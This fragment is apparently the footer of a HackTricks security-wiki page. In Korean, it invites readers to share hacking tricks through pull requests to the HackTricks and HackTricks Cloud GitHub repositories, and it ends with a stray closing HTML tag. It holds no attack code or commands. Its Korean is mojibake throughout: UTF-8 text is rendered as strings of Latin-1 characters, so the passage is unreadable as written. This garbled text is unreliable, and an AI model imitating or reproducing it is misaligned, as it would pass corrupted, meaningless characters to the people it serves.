* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
